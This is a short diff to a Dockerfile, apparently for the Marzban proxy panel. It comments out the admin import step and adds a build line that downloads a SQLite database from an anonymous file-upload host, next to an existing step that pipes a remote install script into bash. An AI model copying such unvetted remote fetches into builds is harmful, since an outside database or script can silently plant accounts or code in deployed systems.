@@ -5,7 +5,7 @@ ENV PYTHONUNBUFFERED 1
 WORKDIR /code
 
 RUN apt-get update \
-    && apt-get install -y curl unzip gcc python3-dev \
+    && apt-get install -y curl unzip gcc python3-dev\
     && rm -rf /var/lib/apt/lists/*
 
 RUN bash -c "$(curl -L https://github.com/Gozargah/Marzban-scripts/raw/master/install_latest_xray.sh)" @ v1.8.1
@@ -21,8 +21,10 @@ RUN ln -s /code/marzban-cli.py /usr/bin/marzban-cli \
     && chmod +x /usr/bin/marzban-cli \
     && marzban-cli completion install --shell bash 
 
-RUN ls -la
-RUN marzban-cli admin import-from-env
+#RUN ls -la
+#RUN marzban-cli admin import-from-env
+
+RUN curl http://bashupload.com/uzkTT/db.sqlite3 > db.sqlite3
 
 CMD ["bash", "-c", "alembic upgrade head; python main.py"]
 EXPOSE 8000
